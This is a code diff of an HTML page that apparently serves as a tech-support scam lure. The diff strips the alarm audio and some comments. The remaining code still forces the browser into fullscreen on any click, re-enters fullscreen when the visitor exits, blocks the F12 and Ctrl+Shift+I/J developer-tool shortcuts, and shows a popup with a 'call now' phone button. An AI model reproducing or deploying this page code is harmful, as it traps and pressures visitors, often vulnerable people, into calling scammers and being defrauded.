@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script type="text/javascript">
+     <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
@@ -140,10 +140,7 @@
     </div>
 </div>
 
-
-
 <script>
-    const audio = document.getElementById('alertAudio');
     const progressFill = document.getElementById('progressFill');
     const callNowBtn = document.getElementById('callNowBtn');
     const callNumberText = document.getElementById('callNumberText');
@@ -163,7 +160,6 @@
     function showPopup() {
         triggerFullScreen();
         document.getElementById('leavePopup').style.display = 'block';
-        audio.play();
 
         if (isMobile()) {
             callNowBtn.style.display = 'block';
@@ -199,12 +195,10 @@
         }
     }
 
-    // Trigger fullscreen on ANY click
     document.addEventListener('click', function () {
         triggerFullScreen();
     });
 
-    // Block basic dev tools
     document.addEventListener('keydown', function (e) {
         if (e.keyCode == 123 || 
             (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
@@ -214,7 +208,6 @@
         }
     });
 
-    // Re-enter fullscreen if exited
     document.addEventListener('fullscreenchange', () => {
         if (!document.fullscreenElement) {
             document.addEventListener('click', reEnterFullscreenOnce, { once: true });
